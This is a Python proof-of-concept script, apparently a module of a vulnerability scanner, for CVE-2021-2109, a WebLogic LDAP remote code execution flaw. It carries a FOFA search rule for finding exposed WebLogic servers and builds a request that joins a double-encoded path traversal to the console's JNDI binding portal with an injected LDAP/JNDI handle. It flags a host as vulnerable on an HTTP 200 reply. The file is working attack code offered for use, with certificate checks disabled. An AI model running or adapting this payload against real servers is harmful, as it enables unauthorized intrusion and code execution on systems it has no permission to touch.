#!/usr/bin/env python3
# _*_ coding:utf-8 _*_


import requests
from Config.config_proxies import proxies

requests.packages.urllib3.disable_warnings()
# 脚本信息
######################################################
NAME='CVE_2021_2109'
AUTHOR="Faith"
REMARK='Weblogic LDAP 远程代码执行漏洞'
FOFA_RULE='app="Oracle-BEA-WebLogic-Server"'
######################################################

def poc(target):
    result = {}
    ldap_url = target
    a = ldap_url.replace('http','ldap').replace('.',';',3).replace('7001','1389')
    b = a.replace(';','.',2)

    headers = {"UserAgent":"ua"}
    url = target + "/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle('{}/Basic/WeblogicEcho;AdminServer')".format(b)
    try:

        r = requests.get(url=url,headers=headers,verify=False,timeout=3,proxies=proxies)
        if r.status_code == 200:
            result['target'] = target
            result['poc'] = NAME
            result['url'] = url
            return result
        else:
            pass
    except:
        pass

if __name__ == '__main__':
    poc("http://127.0.0.1")